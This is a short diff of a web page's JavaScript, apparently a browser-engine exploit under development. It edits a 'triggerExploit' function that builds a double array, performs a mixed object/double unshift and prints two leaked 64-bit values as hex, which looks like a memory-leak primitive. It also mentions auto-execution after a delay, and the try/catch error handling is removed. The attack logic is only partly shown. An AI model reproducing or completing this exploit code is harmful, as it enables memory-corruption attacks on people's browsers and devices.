@@ -34,11 +34,10 @@
             function hex(num) {
                 return '0x' + num.toString(16).padStart(16, '0');
             }
-
-            function triggerExploit() {
-                try {
-                     let arr = [1.1, 2.2, 3.3];
-    for(let i = 0; i < 10000; i++)
+function triggerExploit() {
+              
+         let arr = [1.1, 2.2, 3.3];
+                for(let i = 0; i < 10000; i++)
         arr.push(4.4 + i);  // Evita la deduplicazione
 
     // Unshift misto (oggetto + double)
@@ -54,9 +53,7 @@
     console.log("Leak 1:", hex(new BigUint64Array(buf)[0]));
     new Float64Array(buf)[0] = leak2;
     console.log("Leak 2:", hex(new BigUint64Array(buf)[0]));
-                } catch(e) {
-                    updateLog(`[ERROR] ${e}`);
-                }
+               
             }
 
             // Auto-execute after short delay
